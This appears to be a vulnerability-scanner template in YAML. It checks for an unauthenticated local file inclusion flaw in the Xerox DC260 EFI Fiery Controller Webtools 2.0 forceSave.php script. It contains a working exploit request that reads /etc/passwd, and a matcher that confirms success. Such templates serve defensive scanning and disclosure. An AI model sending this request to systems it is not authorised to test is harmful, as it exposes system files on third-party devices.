id: xerox-efi-lfi
name: Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion
severity: high
confidence: tentative
description: Xerox DC260 EFI Fiery Controller Webtools 2.0 is vulnerable to local file inclusion because input passed thru
  the 'file' GET parameter in 'forceSave.php' script is not properly sanitized before being used to read files. This can be
  exploited by an unauthenticated attacker to read arbitrary files on the affected system.
reference: CWE-22
tags:
- iot
- xerox
- disclosure
- lfi
- packetstorm
- edb
- vuln
requests:
- method: GET
  path: /wt3/forceSave.php?file=/etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  condition: and
